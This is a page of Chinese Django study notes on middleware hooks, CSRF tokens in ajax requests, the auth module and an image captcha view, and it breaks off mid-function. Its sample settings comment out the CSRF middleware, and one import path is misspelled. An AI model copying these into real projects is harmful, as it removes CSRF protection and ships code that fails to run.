<span class="hljs-string">&quot;&quot;&quot;
1.&#x5FC5;&#x987B;&#x638C;&#x63E1;
        process_request 
            1.&#x8BF7;&#x6C42;&#x6765;&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x7ECF;&#x8FC7;&#x6BCF;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_request&#x65B9;&#x6CD5;
            &#x7ED3;&#x679C;&#x7684;&#x987A;&#x5E8F;&#x662F;&#x6309;&#x7167;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CE8;&#x518C;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x4ECE;&#x4E0A;&#x5F80;&#x4E0B;&#x7684;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x6267;&#x884C;
            2.&#x5982;&#x679C;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x8BE5;&#x65B9;&#x6CD5;&#xFF0C;&#x90A3;&#x4E48;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;
            3.&#x5982;&#x679C;&#x8BE5;&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x4E86;HttpResponse&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x8BF7;&#x6C42;&#x5C06;&#x4E0D;&#x518D;&#x7EE7;&#x7EED;&#x5F80;&#x540E;&#x6267;&#x884C;
            &#x800C;&#x662F;&#x76F4;&#x63A5;&#x539F;&#x8DEF;&#x8FD4;&#x56DE;(&#x6821;&#x9A8C;&#x5931;&#x8D25;&#x4E0D;&#x5141;&#x8BB8;&#x8BBF;&#x95EE;...)
            process_request&#x65B9;&#x6CD5;&#x5C31;&#x662F;&#x7528;&#x6765;&#x505A;&#x5168;&#x5C40;&#x76F8;&#x5173;&#x7684;&#x6240;&#x6709;&#x9650;&#x5236;&#x529F;&#x80FD;

        process_response
            1.&#x54CD;&#x5E94;&#x8D70;&#x7684;&#x65F6;&#x5019;&#x9700;&#x8981;&#x7ED3;&#x679C;&#x6BCF;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_response&#x65B9;&#x6CD5;
            &#x8BE5;&#x65B9;&#x6CD5;&#x6709;&#x4E24;&#x4E2A;&#x989D;&#x5916;&#x7684;&#x53C2;&#x6570;request,response
            2.&#x8BE5;&#x65B9;&#x6CD5;&#x5FC5;&#x987B;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;HttpResponse&#x5BF9;&#x8C61;
                1.&#x9ED8;&#x8BA4;&#x8FD4;&#x56DE;&#x7684;&#x5C31;&#x662F;&#x5F62;&#x53C2;response
                2.&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x8FD4;&#x56DE;&#x81EA;&#x5DF1;&#x7684;
            3.&#x987A;&#x5E8F;&#x662F;&#x6309;&#x7167;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CE8;&#x518C;&#x4E86;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x4F9D;&#x6B21;&#x7ECF;&#x8FC7;
                &#x5982;&#x679C;&#x4F60;&#x6CA1;&#x6709;&#x5B9A;&#x4E49;&#x7684;&#x8BDD; &#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x4E2A;

        &#x7814;&#x7A76;&#x5982;&#x679C;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;process_request&#x65B9;&#x6CD5;&#x5C31;&#x5DF2;&#x7ECF;&#x8FD4;&#x56DE;&#x4E86;HttpResponse&#x5BF9;&#x8C61;&#xFF0C;&#x90A3;&#x4E48;&#x54CD;&#x5E94;&#x8D70;&#x7684;&#x65F6;&#x5019;&#x662F;&#x7ECF;&#x8FC7;&#x6240;&#x6709;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_response&#x8FD8;&#x662F;&#x6709;&#x5176;&#x4ED6;&#x60C5;&#x51B5;
        &#x662F;&#x5176;&#x4ED6;&#x60C5;&#x51B5;
            &#x5C31;&#x662F;&#x4F1A;&#x76F4;&#x63A5;&#x8D70;&#x540C;&#x7EA7;&#x522B;&#x7684;process_reponse&#x8FD4;&#x56DE;

        flask&#x6846;&#x67B6;&#x4E5F;&#x6709;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x4F46;&#x662F;&#x5B83;&#x7684;&#x89C4;&#x5F8B;
            &#x53EA;&#x8981;&#x8FD4;&#x56DE;&#x6570;&#x636E;&#x4E86;&#x5C31;&#x5FC5;&#x987B;&#x7ECF;&#x8FC7;&#x6240;&#x6709;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;&#x7C7B;&#x4F3C;&#x4E8E;process_reponse&#x65B9;&#x6CD5;


2.&#x4E86;&#x89E3;&#x5373;&#x53EF;
        process_view
            &#x8DEF;&#x7531;&#x5339;&#x914D;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x6267;&#x884C;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x4E4B;&#x524D;&#xFF0C;&#x4F1A;&#x81EA;&#x52A8;&#x6267;&#x884C;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;&#x8BE5;&#x653E;&#x6CD5;
            &#x987A;&#x5E8F;&#x662F;&#x6309;&#x7167;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CE8;&#x518C;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x4ECE;&#x4E0A;&#x5F80;&#x4E0B;&#x7684;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x6267;&#x884C;

        process_template_response
            &#x8FD4;&#x56DE;&#x7684;HttpResponse&#x5BF9;&#x8C61;&#x6709;render&#x5C5E;&#x6027;&#x7684;&#x65F6;&#x5019;&#x624D;&#x4F1A;&#x89E6;&#x53D1;
            &#x987A;&#x5E8F;&#x662F;&#x6309;&#x7167;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CE8;&#x518C;&#x4E86;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x4F9D;&#x6B21;&#x7ECF;&#x8FC7;

        process_exception
            &#x5F53;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x4E2D;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x89E6;&#x53D1;
            &#x987A;&#x5E8F;&#x662F;&#x6309;&#x7167;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x6CE8;&#x518C;&#x4E86;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;&#x4ECE;&#x4E0B;&#x5F80;&#x4E0A;&#x4F9D;&#x6B21;&#x7ECF;&#x8FC7;
&quot;&quot;&quot;</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> django.utils.depreacation <span class="hljs-keyword">import</span> MiddlewareMixin

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyMiddleware</span><span class="hljs-params">(MiddlewareMixin)</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_request</span><span class="hljs-params">(self,request)</span>:</span>
        print(<span class="hljs-string">&apos;&#x6211;&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_request&#x65B9;&#x6CD5;&apos;</span>)
        <span class="hljs-comment"># return HttpResponse(&apos;baby!&apos;)</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_response</span><span class="hljs-params">(self,request,response)</span>:</span>
        <span class="hljs-string">&quot;&quot;&quot;
        :param request:
        :param response: &#x5C31;&#x662F;django&#x540E;&#x7AEF;&#x8FD4;&#x56DE;&#x7ED9;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x5185;&#x5BB9;
        :return:
        &quot;&quot;&quot;</span>
        print(<span class="hljs-string">&apos;&#x6211;&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_response&#x65B9;&#x6CD5;&apos;</span>)
        <span class="hljs-keyword">return</span> response

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_view</span><span class="hljs-params">(self,request,view_name,*args,**kwargs)</span>:</span>
        print(view_name,args,kwargs)
        print(<span class="hljs-string">&apos;&#x6211;&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_view&apos;</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_template_response</span><span class="hljs-params">(self,request,response)</span>:</span>
        print(<span class="hljs-string">&apos;&#x6211;&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x81EA;&#x5B9A;&#x4E49;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_template_response&apos;</span>)
        <span class="hljs-keyword">return</span> response

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_exception</span><span class="hljs-params">(self,request,exception)</span>:</span>
        print(<span class="hljs-string">&apos;&#x6211;&#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x91CC;&#x9762;&#x7684;process_exception&apos;</span>)
        print(exception)


MIDDLEWARE = [
    <span class="hljs-string">&apos;django.middleware.security.SecurityMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.contrib.sessions.middleware.SessionMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.middleware.common.CommonMiddleware&apos;</span>,
    <span class="hljs-comment"># &apos;django.middleware.csrf.CsrfViewMiddleware&apos;,</span>
    <span class="hljs-string">&apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.contrib.messages.middleware.MessageMiddleware&apos;</span>,
    <span class="hljs-string">&apos;django.middleware.clickjacking.XFrameOptionsMiddleware&apos;</span>,
    <span class="hljs-comment">#   &#x6CE8;&#x518C;&#x81EA;&#x5DF1;&#x7684;&#x4E2D;&#x95F4;&#x4EF6;</span>
    <span class="hljs-string">&apos;app01.mymiddleware.mydd.MyMiddleware&apos;</span>
]
</code></pre>
<h4 id="csrf&#x8BBE;&#x7F6E;token">CSRF&#x8BBE;&#x7F6E;token</h4>
<p>&#x8BBF;&#x95EE;url</p>
<p><a href="https://imgse.com/i/p9rg3TI" target="_blank"><img src="https://s1.ax1x.com/2023/05/11/p9rg3TI.png" alt="p9rg3TI.png"></a></p>
<p><a href="https://imgse.com/i/p9rg10A" target="_blank"><img src="https://s1.ax1x.com/2023/05/11/p9rg10A.png" alt="p9rg10A.png"></a></p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="undefined">
    $(&apos;#d1&apos;).click(function () {
        $.ajax({
            url:&apos;&apos;,
            type:&apos;post&apos;,
            // &#x7B2C;&#x4E00;&#x79CD; &#x5229;&#x7528;&#x6807;&#x7B7E;&#x67E5;&#x627E;&#x83B7;&#x53D6;&#x9875;&#x9762;&#x4E0A;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;
            {#data:{&quot;username&quot;:&apos;jason&apos;,&apos;csrfmiddlewaretoken&apos;:$(&apos;[name=csrfmiddlewaretoken]&apos;).val()},#}
            // &#x7B2C;&#x4E8C;&#x79CD; &#x5229;&#x7528;&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x63D0;&#x4F9B;&#x7684;&#x5FEB;&#x6377;&#x4E66;&#x5199;
            {#data:{&quot;username&quot;:&apos;jason&apos;,&apos;csrfmiddlewaretoken&apos;:&apos;{[ csrf_token ]}&apos;},#}
            // &#x7B2C;&#x4E09;&#x79CD; &#x901A;&#x7528;&#x65B9;&#x5F0F;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;js&#x4EE3;&#x7801;&#x5E76;&#x5E94;&#x7528;&#x5230;&#x81EA;&#x5DF1;&#x7684;html&#x9875;&#x9762;&#x4E0A;&#x5373;&#x53EF;
            data:{&quot;username&quot;:&apos;jason&apos;},
            success:function () {

            }
        })
    })
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-comment"># ajax&#x5982;&#x4F55;&#x7B26;&#x5408;&#x6821;&#x9A8C;</span>
// &#x7B2C;&#x4E00;&#x79CD; &#x5229;&#x7528;&#x6807;&#x7B7E;&#x67E5;&#x627E;&#x83B7;&#x53D6;&#x9875;&#x9762;&#x4E0A;&#x7684;&#x968F;&#x673A;&#x5B57;&#x7B26;&#x4E32;
{<span class="hljs-comment">#data:{&quot;username&quot;:&apos;jason&apos;,&apos;csrfmiddlewaretoken&apos;:$(&apos;[name=csrfmiddlewaretoken]&apos;).val()},#}</span>
// &#x7B2C;&#x4E8C;&#x79CD; &#x5229;&#x7528;&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x63D0;&#x4F9B;&#x7684;&#x5FEB;&#x6377;&#x4E66;&#x5199;
{<span class="hljs-comment">#data:{&quot;username&quot;:&apos;jason&apos;,&apos;csrfmiddlewaretoken&apos;:&apos;{[ csrf_token ]}&apos;},#}</span>
// &#x7B2C;&#x4E09;&#x79CD; &#x901A;&#x7528;&#x65B9;&#x5F0F;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;js&#x4EE3;&#x7801;&#x5E76;&#x5E94;&#x7528;&#x5230;&#x81EA;&#x5DF1;&#x7684;html&#x9875;&#x9762;&#x4E0A;&#x5373;&#x53EF;
data:{<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&apos;jason&apos;</span>}
</code></pre>
<pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCookie</span>(<span class="hljs-params">name</span>) </span>{
    <span class="hljs-keyword">var</span> cookieValue = <span class="hljs-literal">null</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">document</span>.cookie &amp;&amp; <span class="hljs-built_in">document</span>.cookie !== <span class="hljs-string">&apos;&apos;</span>) {
        <span class="hljs-keyword">var</span> cookies = <span class="hljs-built_in">document</span>.cookie.split(<span class="hljs-string">&apos;;&apos;</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cookies.length; i++) {
            <span class="hljs-keyword">var</span> cookie = jQuery.trim(cookies[i]);
            <span class="hljs-comment">// Does this cookie string begin with the name we want?</span>
            <span class="hljs-keyword">if</span> (cookie.substring(<span class="hljs-number">0</span>, name.length + <span class="hljs-number">1</span>) === (name + <span class="hljs-string">&apos;=&apos;</span>)) {
                cookieValue = <span class="hljs-built_in">decodeURIComponent</span>(cookie.substring(name.length + <span class="hljs-number">1</span>));
                <span class="hljs-keyword">break</span>;
            }
        }
    }
    <span class="hljs-keyword">return</span> cookieValue;
}
<span class="hljs-keyword">var</span> csrftoken = getCookie(<span class="hljs-string">&apos;csrftoken&apos;</span>);


<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">csrfSafeMethod</span>(<span class="hljs-params">method</span>) </span>{
  <span class="hljs-comment">// these HTTP methods do not require CSRF protection</span>
  <span class="hljs-keyword">return</span> (<span class="hljs-regexp">/^(GET|HEAD|OPTIONS|TRACE)$/</span>.test(method));
}

$.ajaxSetup({
  beforeSend: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, settings</span>) </span>{
    <span class="hljs-keyword">if</span> (!csrfSafeMethod(settings.type) &amp;&amp; !<span class="hljs-keyword">this</span>.crossDomain) {
      xhr.setRequestHeader(<span class="hljs-string">&quot;X-CSRFToken&quot;</span>, csrftoken);
    }
  }
});
</code></pre>
<h4 id="auth&#x6A21;&#x5757;">Auth&#x6A21;&#x5757;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x5728;&#x521B;&#x5EFA;&#x597D;&#x4E00;&#x4E2A;django&#x9879;&#x76EE;&#x4E4B;&#x540E;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#x8FC1;&#x79FB;&#x547D;&#x4EE4;&#x4F1A;&#x81EA;&#x52A8;&#x751F;&#x6210;&#x5F88;&#x591A;&#x8868;
    django_session
    auth_user
django&#x5728;&#x542F;&#x52A8;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;admin&#x8DEF;&#x7531;&#xFF0C;&#x9700;&#x8981;&#x8F93;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x6570;&#x636E;&#x53C2;&#x8003;&#x7684;&#x5C31;&#x662F;auth_user&#x8868;,&#x5E76;&#x4E14;&#x8FD8;&#x5FC5;&#x987B;&#x662F;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x624D;&#x80FD;&#x8FDB;&#x5165;

&#x521B;&#x5EFA;&#x8D85;&#x7EA7;&#x7528;&#x6237;(&#x7BA1;&#x7406;&#x5458;)
    python manage.py createsuperuser

&#x4F9D;&#x8D56;&#x4E8E;auth_user&#x8868;&#x5B8C;&#x6210;&#x7528;&#x6237;&#x76F8;&#x5173;&#x7684;&#x6240;&#x6709;&#x529F;&#x80FD;
&quot;&quot;&quot;</span>
sha256
</code></pre>
<p><a href="https://imgse.com/i/p9rWD7d" target="_blank"><img src="https://s1.ax1x.com/2023/05/11/p9rWD7d.png" alt="p9rWD7d.png"></a></p>
<pre><code class="lang-python"># 1.&#x6BD4;&#x5BF9;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x662F;&#x5426;&#x6B63;&#x786E;
user_obj = auth.authenticate(request,username=username,password=password)
# &#x62EC;&#x53F7;&#x5185;&#x5FC5;&#x987B;&#x540C;&#x65F6;&#x4F20;&#x5165;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;
print(user_obj)  # &#x7528;&#x6237;&#x5BF9;&#x8C61;  jason   &#x6570;&#x636E;&#x4E0D;&#x7B26;&#x5408;&#x5219;&#x8FD4;&#x56DE;None
print(user_obj.username)  # jason
print(user_obj.password)  # &#x5BC6;&#x6587;

# 2.&#x4FDD;&#x5B58;&#x7528;&#x6237;&#x72B6;&#x6001;
auth.login(request,user_obj)  # &#x7C7B;&#x4F3C;&#x4E8E;request.session[key] = user_obj
# &#x4E3B;&#x8981;&#x6267;&#x884C;&#x4E86;&#x8BE5;&#x65B9;&#x6CD5; &#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x901A;&#x8FC7;request.user&#x83B7;&#x53D6;&#x5230;&#x5F53;&#x524D;&#x767B;&#x9646;&#x7684;&#x7528;&#x6237;&#x5BF9;&#x8C61;

# 3.&#x5224;&#x65AD;&#x5F53;&#x524D;&#x7528;&#x6237;&#x662F;&#x5426;&#x767B;&#x9646;
request.user.is_authenticated()

# 4.&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x767B;&#x9646;&#x7528;&#x6237;
request.user

# 5.&#x6821;&#x9A8C;&#x7528;&#x6237;&#x662F;&#x5426;&#x767B;&#x9646;&#x88C5;&#x9970;&#x5668;
from django.contrib.auth.decorators import login_required
# &#x5C40;&#x90E8;&#x914D;&#x7F6E;
@login_required(login_url=&apos;/login/&apos;) 
# &#x5168;&#x5C40;&#x914D;&#x7F6E;
LOGIN_URL = &apos;/login/&apos;
    1.&#x5982;&#x679C;&#x5C40;&#x90E8;&#x548C;&#x5168;&#x5C40;&#x90FD;&#x6709; &#x8BE5;&#x542C;&#x8C01;&#x7684;?
    &#x5C40;&#x90E8; &gt; &#x5168;&#x5C40;
    2.&#x5C40;&#x90E8;&#x548C;&#x5168;&#x5C40;&#x54EA;&#x4E2A;&#x597D;&#x5462;?
    &#x5168;&#x5C40;&#x7684;&#x597D;&#x5904;&#x5728;&#x4E8E;&#x65E0;&#x9700;&#x91CD;&#x590D;&#x5199;&#x4EE3;&#x7801; &#x4F46;&#x662F;&#x8DF3;&#x8F6C;&#x7684;&#x9875;&#x9762;&#x5374;&#x5F88;&#x5355;&#x4E00;
    &#x5C40;&#x90E8;&#x7684;&#x597D;&#x5904;&#x5728;&#x4E8E;&#x4E0D;&#x540C;&#x7684;&#x89C6;&#x56FE;&#x51FD;&#x6570;&#x5728;&#x7528;&#x6237;&#x6CA1;&#x6709;&#x767B;&#x9646;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x8DF3;&#x8F6C;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x9875;&#x9762;

# 6.&#x6BD4;&#x5BF9;&#x539F;&#x5BC6;&#x7801;
request.user.check_password(old_password)

# 7.&#x4FEE;&#x6539;&#x5BC6;&#x7801;
request.user.set_password(new_password)  # &#x4EC5;&#x4EC5;&#x662F;&#x5728;&#x4FEE;&#x6539;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;
request.user.save()  # &#x8FD9;&#x4E00;&#x6B65;&#x624D;&#x662F;&#x771F;&#x6B63;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;

# 8.&#x6CE8;&#x9500;
auth.logout(request) 

# 9.&#x6CE8;&#x518C;
# &#x64CD;&#x4F5C;auth_user&#x8868;&#x5199;&#x5165;&#x6570;&#x636E;
User.objects.create(username=username,password=password)  # &#x5199;&#x5165;&#x6570;&#x636E;  &#x4E0D;&#x80FD;&#x7528;create &#x5BC6;&#x7801;&#x6CA1;&#x6709;&#x52A0;&#x5BC6;&#x5904;&#x7406;
# &#x521B;&#x5EFA;&#x666E;&#x901A;&#x7528;&#x6237;
User.objects.create_user(username=username,password=password)
# &#x521B;&#x5EFA;&#x8D85;&#x7EA7;&#x7528;&#x6237;(&#x4E86;&#x89E3;):&#x4F7F;&#x7528;&#x4EE3;&#x7801;&#x521B;&#x5EFA;&#x8D85;&#x7EA7;&#x7528;&#x6237; &#x90AE;&#x7BB1;&#x662F;&#x5FC5;&#x586B;&#x7684; &#x800C;&#x7528;&#x547D;&#x4EE4;&#x521B;&#x5EFA;&#x5219;&#x53EF;&#x4EE5;&#x4E0D;&#x586B;
User.objects.create_superuser(username=username,email=&apos;123@qq.com&apos;,password=password)
</code></pre>
<h4 id="&#x8868;&#x8BBE;&#x8BA1;">&#x8868;&#x8BBE;&#x8BA1;</h4>
<pre><code>~~~





#### &#x9A8C;&#x8BC1;&#x7801;&#x529F;&#x80FD;

~~~python
def login(request):
    if request.method == &apos;POST&apos;:
        back_dic = {&apos;code&apos;:1000,&apos;msg&apos;:&apos;&apos;}
        username = request.POST.get(&apos;username&apos;)
        password = request.POST.get(&apos;password&apos;)
        code = request.POST.get(&apos;code&apos;)
        # 1 &#x5148;&#x6821;&#x9A8C;&#x9A8C;&#x8BC1;&#x7801;&#x662F;&#x5426;&#x6B63;&#x786E;      &#x81EA;&#x5DF1;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x5FFD;&#x7565;            &#x7EDF;&#x4E00;&#x8F6C;&#x5927;&#x5199;&#x6216;&#x8005;&#x5C0F;&#x5199;&#x518D;&#x6BD4;&#x8F83;
        if request.session.get(&apos;code&apos;).upper() == code.upper():
            # 2 &#x6821;&#x9A8C;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;&#x662F;&#x5426;&#x6B63;&#x786E;
            user_obj = auth.authenticate(request,username=username,password=password)
            if user_obj:
                # &#x4FDD;&#x5B58;&#x7528;&#x6237;&#x72B6;&#x6001;
                auth.login(request,user_obj)
                back_dic[&apos;url&apos;] = &apos;/home/&apos;
            else:
                back_dic[&apos;code&apos;] = 2000
                back_dic[&apos;msg&apos;] = &apos;&#x7528;&#x6237;&#x540D;&#x6216;&#x5BC6;&#x7801;&#x9519;&#x8BEF;&apos;
        else:
            back_dic[&apos;code&apos;] = 3000
            back_dic[&apos;msg&apos;] = &apos;&#x9A8C;&#x8BC1;&#x7801;&#x9519;&#x8BEF;&apos;
        return JsonResponse(back_dic)
    return render(request,&apos;login.html&apos;)

&quot;&quot;&quot;
&#x56FE;&#x7247;&#x76F8;&#x5173;&#x7684;&#x6A21;&#x5757;
    pip3 install pillow
&quot;&quot;&quot;
from PIL import Image,ImageDraw,ImageFont
&quot;&quot;&quot;
Image:&#x751F;&#x6210;&#x56FE;&#x7247;
ImageDraw:&#x80FD;&#x591F;&#x5728;&#x56FE;&#x7247;&#x4E0A;&#x4E71;&#x6D82;&#x4E71;&#x753B;
ImageFont:&#x63A7;&#x5236;&#x5B57;&#x4F53;&#x6837;&#x5F0F;
&quot;&quot;&quot;
from io import BytesIO,StringIO
&quot;&quot;&quot;
&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x5668;&#x6A21;&#x5757;
BytesIO:&#x4E34;&#x65F6;&#x5E2E;&#x4F60;&#x5B58;&#x50A8;&#x6570;&#x636E; &#x8FD4;&#x56DE;&#x7684;&#x65F6;&#x5019;&#x6570;&#x636E;&#x662F;&#x4E8C;&#x8FDB;&#x5236;
StringIO:&#x4E34;&#x65F6;&#x5E2E;&#x4F60;&#x5B58;&#x50A8;&#x6570;&#x636E; &#x8FD4;&#x56DE;&#x7684;&#x65F6;&#x5019;&#x6570;&#x636E;&#x662F;&#x5B57;&#x7B26;&#x4E32;
&quot;&quot;&quot;
import random
def get_random():
    return random.randint(0,255),random.randint(0,255),random.randint(0,255)
def get_code(request):
    # &#x63A8;&#x5BFC;&#x6B65;&#x9AA4;1:&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x540E;&#x7AEF;&#x73B0;&#x6210;&#x7684;&#x56FE;&#x7247;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x53D1;&#x9001;&#x7ED9;&#x524D;&#x7AEF;
    # with open(r&apos;static/img/111.jpg&apos;,&apos;rb&apos;) as f:
    #     data = f.read()
    # return HttpResponse(data)

    # &#x63A8;&#x5BFC;&#x6B65;&#x9AA4;2:&#x5229;&#x7528;pillow&#x6A21;&#x5757;&#x52A8;&#x6001;&#x4EA7;&#x751F;&#x56FE;&#x7247;
    # img_obj = Image.new(&apos;RGB&apos;,(430,35),&apos;green&apos;)
    # img_obj = Image.new(&apos;RGB&apos;,(430,35),get_random())
    # # &#x5148;&#x5C06;&#x56FE;&#x7247;&#x5BF9;&#x8C61;&#x4FDD;&#x5B58;&#x8D77;&#x6765;
    # with open(&apos;xxx.png&apos;,&apos;wb&apos;) as f:
    #     img_obj.save(f,&apos;png&apos;)
    # # &#x518D;&#x5C06;&#x56FE;&#x7247;&#x5BF9;&#x8C61;&#x8BFB;&#x53D6;&#x51FA;&#x6765;
    # with open(&apos;xxx.png&apos;,&apos;rb&apos;) as f:
    #     data = f.read()
    # return HttpResponse(data)

    # &#x63A8;&#x5BFC;&#x6B65;&#x9AA4;3:&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x7E41;&#x7410;IO&#x64CD;&#x4F5C;&#x6548;&#x7387;&#x4F4E;  &#x501F;&#x52A9;&#x4E8E;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x5668;&#x6A21;&#x5757;
    # img_obj = Image.new(&apos;RGB&apos;, (430, 35), get_random())
    # io_obj = BytesIO()  # &#x751F;&#x6210;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x5668;&#x5BF9;&#x8C61;  &#x4F60;&#x53EF;&#x4EE5;&#x770B;&#x6210;&#x662F;&#x6587;&#x4EF6;&#x53E5;&#x67C4;
    # img_obj.save(io_obj,&apos;png&apos;)
    # return HttpResponse(io_obj.getvalue())  # &#x4ECE;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x5668;&#x4E2D;&#x8BFB;&#x53D6;&#x4E8C;&#x8FDB;&#x5236;&#x7684;&#x56FE;&#x7247;&#x6570;&#x636E;&#x8FD4;&#x56DE;&#x7ED9;&#x524D;&#x7AEF;


    # &#x6700;&#x7EC8;&#x6B65;&#x9AA4;4:&#x5199;&#x56FE;&#x7247;&#x9A8C;&#x8BC1;&#x7801;
    img_obj = Image.new(&apos;RGB&apos;, (430, 35), get_random())
    img_draw = ImageDraw.Draw(img_obj)  # &#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x753B;&#x7B14;&#x5BF9;&#x8C61;
    img_font = ImageFont.truetype(&apos;static/font/222.ttf&apos;,30)  # &#x5B57;&#x4F53;&#x6837;&#x5F0F; &#x5927;&#x5C0F;

    # &#x968F;&#x673A;&#x9A8C;&#x8BC1;&#x7801;  &#x4E94;&#x4F4D;&#x6570;&#x7684;&#x968F;&#x673A;&#x9A8C;&#x8BC1;&#x7801;  &#x6570;&#x5B57; &#x5C0F;&#x5199;&#x5B57;&#x6BCD; &#x5927;&#x5199;&#x5B57;&#x6BCD;
    code = &apos;&apos;
    for i in range(5):
